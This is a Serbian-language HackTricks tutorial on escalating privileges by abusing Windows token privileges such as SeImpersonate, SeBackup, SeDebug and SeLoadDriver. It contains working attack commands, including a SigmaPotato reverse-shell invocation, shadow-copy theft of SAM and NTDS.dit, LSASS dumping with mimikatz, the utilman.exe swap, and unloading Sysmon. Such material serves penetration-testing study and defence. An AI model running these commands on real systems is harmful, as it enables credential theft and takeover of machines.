# Zloupotreba Tokena

{{#include ../../banners/hacktricks-training.md}}

## Tokeni

Ako **ne znate šta su Windows Access Tokens**, pročitajte ovu stranicu pre nego što nastavite:


{{#ref}}
access-tokens.md
{{#endref}}

**Možda ćete moći da eskalirate privilegije zloupotrebom tokena koje već posedujete.**

### SeImpersonatePrivilege

Ova privilegija omogućava procesu da se predstavlja kao drugi korisnik (ali ne i da kreira token) kada može da dobije handle do tog tokena. Privilegovani token može da se pribavi iz Windows servisa (DCOM) tako što se servis navede da obavi NTLM autentifikaciju prema exploit-u, čime se naknadno omogućava pokretanje procesa sa SYSTEM privilegijama.<sup>[[2]](#references)</sup> Ovaj primitive može da se iskoristi pomoću alata kao što su [JuicyPotato](https://github.com/ohpe/juicy-potato), [RogueWinRM](https://github.com/antonioCoco/RogueWinRM) (koji zahteva da WinRM bude onemogućen), [SweetPotato](https://github.com/CCob/SweetPotato) i [PrintSpoofer](https://github.com/itm4n/PrintSpoofer).

Napomene za moderne operatere:

- **JuicyPotato je zastareo**: na Windows 10 1809+/Server 2019+ preferirajte **GodPotato**, **SigmaPotato**, **PrintNotifyPotato**, **RoguePotato**, **SharpEfsPotato/EfsPotato** ili **PrintSpoofer**, u zavisnosti od toga koja RPC/COM površina je i dalje dostupna.
- Ako ste kompromitovali servis koji radi kao **`LOCAL SERVICE`** ili **`NETWORK SERVICE`**, a `whoami /priv` prikazuje **filtrirani token** bez `SeImpersonatePrivilege`/`SeAssignPrimaryTokenPrivilege`, najpre vratite **podrazumevani skup privilegija** naloga (na primer pomoću **FullPowers**), a zatim ponovo pokušajte sa potato porodicom alata.<sup>[[3]](#references)</sup>
- Neki noviji fork-ovi su prilagođeniji operaterima od originalnih alata. Na primer, **SigmaPotato** dodaje reflection/in-memory execution i kompatibilnost sa modernim verzijama Windows-a, dok **PrintNotifyPotato** zloupotrebljava PrintNotify COM servis i često je koristan kada je klasična Spooler putanja onemogućena.
```cmd
FullPowers.exe -c "cmd /c whoami /priv" -z
GodPotato.exe -cmd "cmd /c whoami"
SigmaPotato.exe --revshell <ip> <port>
PrintNotifyPotato.exe whoami
```
{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}


{{#ref}}
juicypotato.md
{{#endref}}

### SeAssignPrimaryPrivilege

Veoma je sličan privilegiji **SeImpersonatePrivilege**; koristiće **isti metod** za dobijanje privilegovanog tokena.\
Zatim, ova privilegija omogućava **dodeljivanje primarnog tokena** novom/zaustavljenom procesu. Pomoću privilegovanog impersonation tokena možete izvesti primarni token (DuplicateTokenEx).\
Pomoću tokena možete kreirati **novi proces** sa funkcijom 'CreateProcessAsUser' ili kreirati zaustavljen proces i **postaviti token** (generalno ne možete menjati primarni token procesa koji je u radu).<sup>[[2]](#references)</sup>

### SeTcbPrivilege

Ako imate omogućenu ovu privilegiju, možete koristiti **KERB_S4U_LOGON** za dobijanje **impersonation tokena** za bilo kog drugog korisnika bez poznavanja akreditiva, **dodati proizvoljnu grupu** (admins) tokenu, postaviti **nivo integriteta** tokena na "**medium**" i dodeliti ovaj token **trenutnoj niti** (SetThreadToken).<sup>[[2]](#references)</sup>

### SeBackupPrivilege

Ova privilegija omogućava sistemu da **odobri punu kontrolu čitanja** nad bilo kojom datotekom (ograničeno na operacije čitanja). Koristi se za **čitanje password hash-eva lokalnih Administrator** naloga iz registry-ja, nakon čega se alati kao što su "**psexec**" ili "**wmiexec**" mogu koristiti sa hash-em (Pass-the-Hash tehnika). Međutim, ova tehnika ne uspeva u dva slučaja: kada je nalog Local Administrator onemogućen ili kada postoji politika koja uklanja administratorska prava lokalnim administratorima koji se povezuju udaljeno.<sup>[[2]](#references)</sup>\
U praksi je najpouzdaniji ugrađeni workflow obično **VSS + `robocopy /b`**: kreirajte/izložite shadow copy, a zatim kopirajte `SAM`/`SYSTEM` ili `NTDS.dit` u **backup mode-u**, čime se zaobilaze file ACL-ovi.<sup>[[4]](#references)</sup>
```cmd
:: shadow.txt
set context persistent nowriters
add volume c: alias tk
create
expose %tk% z:

:: then copy sensitive files from the snapshot
diskshadow /s shadow.txt
robocopy /b z:\Windows\System32\Config C:\temp SAM SYSTEM SECURITY
robocopy /b z:\Windows\NTDS C:\temp ntds.dit
```
Možete **zloupotrebiti ovu privilegiju** pomoću:

- [https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1](https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1)
- [https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug](https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug)
- praćenjem **IppSec** u [https://www.youtube.com/watch?v=IfCysW0Od8w\&t=2610\&ab_channel=IppSec](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610&ab_channel=IppSec)
- Ili kao što je objašnjeno u odeljku **escalating privileges with Backup Operators** na:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### SeRestorePrivilege

Ova privilegija omogućava **write access** svakom sistemskom fajlu, bez obzira na Access Control List (ACL) tog fajla. Ona otvara brojne mogućnosti za eskalaciju, uključujući mogućnost **modifikovanja servisa**, izvršavanja DLL Hijacking-a i postavljanja **debuggera** putem Image File Execution Options, između ostalih tehnika.<sup>[[2]](#references)</sup>

### SeCreateTokenPrivilege

SeCreateTokenPrivilege je moćna dozvola, naročito korisna kada korisnik poseduje mogućnost impersonacije tokena, ali i u odsustvu SeImpersonatePrivilege. Ova mogućnost zavisi od toga da li je moguće impersonirati token koji predstavlja istog korisnika i čiji nivo integriteta ne premašuje nivo integriteta trenutnog procesa.<sup>[[2]](#references)</sup>

**Ključne tačke:**

- **Impersonacija bez SeImpersonatePrivilege:** SeCreateTokenPrivilege je moguće iskoristiti za EoP impersoniranjem tokena pod određenim uslovima.
- **Uslovi za impersonaciju tokena:** Uspešna impersonacija zahteva da ciljni token pripada istom korisniku i da ima nivo integriteta koji je manji ili jednak nivou integriteta procesa koji vrši impersonaciju.
- **Kreiranje i izmena tokena za impersonaciju:** Korisnici mogu kreirati token za impersonaciju i proširiti ga dodavanjem SID-a (Security Identifier) privilegovane grupe.

### SeLoadDriverPrivilege

Ova privilegija omogućava procesu da **učitava i uklanja device drivere** kreiranjem registry unosa sa određenim vrednostima `ImagePath` i `Type`. Pošto je direktan write access nad `HKLM` (HKEY_LOCAL_MACHINE) ograničen, umesto njega se može koristiti `HKCU` (HKEY_CURRENT_USER). Međutim, potreban je specifičan path kako bi kernel prepoznao `HKCU` unos kao konfiguraciju drivera.<sup>[[2]](#references)</sup>

Savremena ofanzivna upotreba obično podrazumeva **BYOVD** (bring your own vulnerable driver): učitavanje **potpisanog, ali ranjivog** kernel drivera, a zatim korišćenje njegovih IOCTL-ova za onemogućavanje zaštita ili prelazak na izvršavanje koda u kernelu. Imajte na umu da na novijim Windows 11/Server buildovima **Microsoft vulnerable driver blocklist** i/ili **HVCI/Memory Integrity** često onemogućavaju starije javno dostupne chains, pa klasični primeri u stilu `szkg64.sys` više nisu univerzalno pouzdani.

Ovaj path je `\Registry\User\<RID>\System\CurrentControlSet\Services\DriverName`, gde je `<RID>` Relative Identifier trenutnog korisnika. Unutar `HKCU` potrebno je kreirati ceo ovaj path i postaviti dve vrednosti:<sup>[[2]](#references)</sup>

- `ImagePath`, odnosno path do binary-ja koji treba izvršiti
- `Type`, sa vrednošću `SERVICE_KERNEL_DRIVER` (`0x00000001`).

**Koraci:**

1. Pristupite `HKCU` umesto `HKLM`, zbog ograničenog write access-a.
2. Kreirajte path `\Registry\User\<RID>\System\CurrentControlSet\Services\DriverName` unutar `HKCU`, gde `<RID>` predstavlja Relative Identifier trenutnog korisnika.
3. Postavite `ImagePath` na execution path binary-ja.
4. Dodelite `Type` kao `SERVICE_KERNEL_DRIVER` (`0x00000001`).
```python
# Example Python code to set the registry values
import winreg as reg

# Define the path and values
path = r'Software\YourPath\System\CurrentControlSet\Services\DriverName' # Adjust 'YourPath' as needed
key = reg.OpenKey(reg.HKEY_CURRENT_USER, path, 0, reg.KEY_WRITE)
reg.SetValueEx(key, "ImagePath", 0, reg.REG_SZ, "path_to_binary")
reg.SetValueEx(key, "Type", 0, reg.REG_DWORD, 0x00000001)
reg.CloseKey(key)
```
Još načina za zloupotrebu ove privilegije nalazi se na [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges#seloaddriverprivilege](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges#seloaddriverprivilege)

### SeTakeOwnershipPrivilege

Ovo je slično privilegiji **SeRestorePrivilege**. Njena primarna funkcija omogućava procesu da **preuzme vlasništvo nad objektom**, zaobilazeći zahtev za eksplicitnim diskrecionim pristupom obezbeđivanjem prava pristupa WRITE_OWNER. Proces prvo podrazumeva preuzimanje vlasništva nad željenim registry ključem radi upisivanja, a zatim izmenu DACL-a kako bi se omogućile operacije upisa.<sup>[[2]](#references)</sup>
```bash
takeown /f 'C:\some\file.txt' #Now the file is owned by you
icacls 'C:\some\file.txt' /grant <your_username>:F #Now you have full access
# Use this with files that might contain credentials such as
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software
%WINDIR%\repair\security
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
c:\inetpub\wwwwroot\web.config
```
### SeDebugPrivilege

Ova privilegija omogućava **otklanjanje grešaka u drugim procesima**, uključujući čitanje i upisivanje u memoriju. Različite strategije za memory injection, koje mogu zaobići većinu antivirusnih rešenja i rešenja za sprečavanje upada na host, mogu se primeniti uz ovu privilegiju.<sup>[[2]](#references)</sup>

Na modernom Windowsu imajte na umu da je `SeDebugPrivilege` obično dovoljna za otvaranje **nezaštićenih SYSTEM procesa** i dupliciranje njihovih tokena, ali **ne garantuje** da možete pristupiti procesu **LSASS**. Ako je omogućena opcija **RunAsPPL / LSA Protection**, nezaštićeni procesi ne mogu da čitaju iz procesa LSASS niti da vrše injection u njega, čak i kada je prisutna privilegija `SeDebugPrivilege`. U tom slučaju ukradite token iz drugog nezaštićenog SYSTEM procesa ili povežite postupak sa PPL bypass/BYOVD tehnikom, umesto da pretpostavite da će `procdump` raditi. Za kompletan primer kopiranja tokena koji koristi `SeDebugPrivilege` + `SeImpersonatePrivilege` pogledajte [ovu stranicu](sedebug-+-seimpersonate-copy-token.md).

#### Dump memory

Možete koristiti [ProcDump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) iz [SysInternals Suite](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite) za **preuzimanje memorije procesa**. Konkretno, ovo se može primeniti na proces **Local Security Authority Subsystem Service (**[**LSASS**](https://en.wikipedia.org/wiki/Local_Security_Authority_Subsystem_Service)**)**, koji je zadužen za čuvanje korisničkih kredencijala nakon što se korisnik uspešno prijavi na sistem.

Zatim možete učitati ovaj dump u mimikatz da biste dobili lozinke:
```
mimikatz.exe
mimikatz # log
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords
```
#### RCE

Ako želite da dobijete `NT SYSTEM` shell, možete koristiti:

- [**SeDebugPrivilege-Exploit (C++)**](https://github.com/bruno-1337/SeDebugPrivilege-Exploit)
- [**SeDebugPrivilegePoC (C#)**](https://github.com/daem0nc0re/PrivFu/tree/main/PrivilegedOperations/SeDebugPrivilegePoC)
- [**psgetsys.ps1 (Powershell Script)**](https://raw.githubusercontent.com/decoder-it/psgetsystem/master/psgetsys.ps1)
```bash
# Get the PID of a process running as NT SYSTEM
import-module psgetsys.ps1; [MyProcess]::CreateProcessFromParent(<system_pid>,<command_to_execute>)
```
### SeManageVolumePrivilege

Ovo pravo (Perform volume maintenance tasks) omogućava otvaranje raw volume device handles (npr. \\.\C:) za direktan disk I/O koji zaobilazi NTFS ACL-ove. Na ovaj način možete kopirati bajtove bilo koje datoteke na volumenu čitanjem osnovnih blokova, što omogućava proizvoljno čitanje datoteka sa osetljivim materijalom (npr. privatnih ključeva računara u %ProgramData%\Microsoft\Crypto\, registry hives, SAM/NTDS putem VSS-a).<sup>[[5]](#references)</sup> Ovo je naročito značajno na CA serverima, gde eksfiltracija privatnog ključa CA omogućava kreiranje Golden Certificate-a za impersonaciju bilo kog principal-a.<sup>[[6]](#references)</sup>

Pogledajte detaljne tehnike i mere zaštite:

{{#ref}}
semanagevolume-perform-volume-maintenance-tasks.md
{{#endref}}

## Provera privilegija
```
whoami /priv
```
**tokeni koji se prikazuju kao Disabled** obično mogu da se omoguće, tako da često možete zloupotrebiti i privilegije _Enabled_ i _Disabled_.

### Omogućavanje svih tokena

Ako imate onemogućene privilegije, možete koristiti skriptu [**EnableAllTokenPrivs.ps1**](https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1) da omogućite sve tokene:
```bash
.\EnableAllTokenPrivs.ps1
whoami /priv
```
Ili **script** ugrađen u ovu [**objavu**](https://www.leeholmes.com/adjusting-token-privileges-in-powershell/).

## Tabela

Potpuni cheatsheet za privilegije tokena nalazi se na adresi [https://github.com/gtworek/Priv2Admin](https://github.com/gtworek/Priv2Admin), dok će sažetak u nastavku navesti samo direktne načine za iskorišćavanje privilegije radi dobijanja admin sesije ili čitanja osetljivih datoteka.<sup>[[1]](#references)</sup>

| Privilege                  | Uticaj      | Alat                    | Putanja izvršavanja                                                                                                                                                                                                                                                                                                                                     | Napomene                                                                                                                                                                                                                                                                                                                        |
| -------------------------- | ----------- | ----------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| **`SeAssignPrimaryToken`** | _**Admin**_ | alat treće strane          | _"Omogućava korisniku da impersonate tokene i izvrši privesc do nt system koristeći alate kao što su potato.exe, rottenpotato.exe i juicypotato.exe"_                                                                                                                                                                                                      | Hvala [Aurélien Chalot](https://twitter.com/Defte_) na dopuni. Uskoro ću pokušati da ovo preformulišem u nešto više nalik receptu.                                                                                                                                                                                         |
| **`SeBackup`**             | **Pretnja**  | _**Built-in commands**_ | Čitanje osetljivih datoteka pomoću `robocopy /b` ili namenskih helpera za kopiranje koji podržavaju SeBackup.                                                                                                                                                                                                                                                                 | <p>- Odlično za `SAM`/`SYSTEM`, `SECURITY`, `NTDS.dit` i ponekad `%WINDIR%\MEMORY.DMP`.<br><br>- `robocopy` je praktičan, ali namenski SeBackup cmdlets/API-ji često pružaju veću fleksibilnost za zaključane/otvorene datoteke.</p>                                                                                                   |
| **`SeCreateToken`**        | _**Admin**_ | alat treće strane          | Kreiranje proizvoljnog tokena, uključujući lokalna admin prava, pomoću `NtCreateToken`.                                                                                                                                                                                                                                                                          |                                                                                                                                                                                                                                                                                                                                |
| **`SeDebug`**              | _**Admin**_ | **PowerShell**          | Dupliranje **non-PPL** SYSTEM tokena ili dump memorije iz nezaštićenog procesa.                                                                                                                                                                                                                                                                 | <p>LSASS dumping je obično blokiran ako je omogućena RunAsPPL/LSA Protection.</p><p>Script se nalazi na adresi [FuzzySecurity](https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Conjure-LSASS.ps1)</p>                                                                                                               |
| **`SeImpersonate`**        | _**Admin**_ | alat treće strane          | Korišćenje **Potato family** / impersonation-a pomoću named pipe-a za pokretanje SYSTEM-a (`PrintSpoofer`, `RoguePotato`, `GodPotato`, `SigmaPotato`, `PrintNotifyPotato`, itd.).                                                                                                                                                                                    | <p>Najpraktičnije je iz service account-a kao što su IIS APPPOOL, MSSQL, scheduled tasks ili bilo kog konteksta koji već poseduje `SeImpersonatePrivilege`.</p>                                                                                                                                                                            |
| **`SeLoadDriver`**         | _**Admin**_ | alat treće strane          | <p>1. Učitati potpisan, ali ranjiv kernel driver (BYOVD)<br>2. Koristiti IOCTL-ove drivera za dobijanje kernel R/W pristupa, onesposobljavanje security tooling-a ili eskalaciju do SYSTEM-a<br><br>Alternativno, privilegija može da se koristi za unloading security-related drivera pomoću <code>fltMC</code> builtin command-a, npr. <code>fltMC sysmondrv</code></p>                     | <p>Stariji javno dostupni driveri, kao što je <code>szkg64.sys</code>, sve se češće blokiraju na modernom Windows-u pomoću vulnerable-driver blocklist-a / HVCI-ja.</p>                                                                                                                                                                               |
| **`SeRestore`**            | _**Admin**_ | **PowerShell**          | <p>1. Pokrenuti PowerShell/ISE sa prisutnom SeRestore privilegijom.<br>2. Omogućiti privilegiju pomoću <a href="https://github.com/gtworek/PSBits/blob/master/Misc/EnableSeRestorePrivilege.ps1">Enable-SeRestorePrivilege</a>).<br>3. Preimenovati utilman.exe u utilman.old<br>4. Preimenovati cmd.exe u utilman.exe<br>5. Zaključati konzolu i pritisnuti Win+U</p> | <p>Neki AV software može detektovati napad.</p><p>Alternativni metod se oslanja na zamenu service binarija sačuvanih u fascikli "Program Files" pomoću iste privilegije</p>                                                                                                                                                            |
| **`SeTakeOwnership`**      | _**Admin**_ | _**Built-in commands**_ | <p>1. <code>takeown.exe /f "%windir%\system32"</code><br>2. <code>icacls.exe "%windir%\system32" /grant "%username%":F</code><br>3. Preimenovati cmd.exe u utilman.exe<br>4. Zaključati konzolu i pritisnuti Win+U</p>                                                                                                                                       | <p>Neki AV software može detektovati napad.</p><p>Alternativni metod se oslanja na zamenu service binarija sačuvanih u fascikli "Program Files" pomoću iste privilegije.</p>                                                                                                                                                           |
| **`SeTcb`**                | _**Admin**_ | alat treće strane          | <p>Manipulisati tokenima tako da sadrže lokalna admin prava. Može zahtevati SeImpersonate.</p><p>Potrebno proveriti.</p>                                                                                                                                                                                                                                     |                                                                                                                                                                                                                                                                                                                                |

## References

- [1] [gtworek/Priv2Admin - putevi eksploatacije od Windows privilegija do admin prava](https://github.com/gtworek/Priv2Admin)
- [2] [Abusing Token Privileges For LPE](https://github.com/hatRiot/token-priv/blob/master/abusing_token_eop_1.0.txt)
- [3] [itm4n – Vratite mi moje privilegije! Molim vas?](https://itm4n.github.io/localservice-privileges/)
- [4] [Microsoft – Robocopy (`/b` backup režim zaobilazi ACL provere datoteka/fascikli)](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy)
- [5] [Microsoft – Izvršavanje zadataka održavanja volumena (SeManageVolumePrivilege)](https://learn.microsoft.com/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/perform-volume-maintenance-tasks)
- [6] [0xdf – HTB: Certificate (SeManageVolumePrivilege → eksfiltracija CA ključa → Golden Certificate)](https://0xdf.gitlab.io/2025/10/04/htb-certificate.html)
{{#include ../../banners/hacktricks-training.md}}
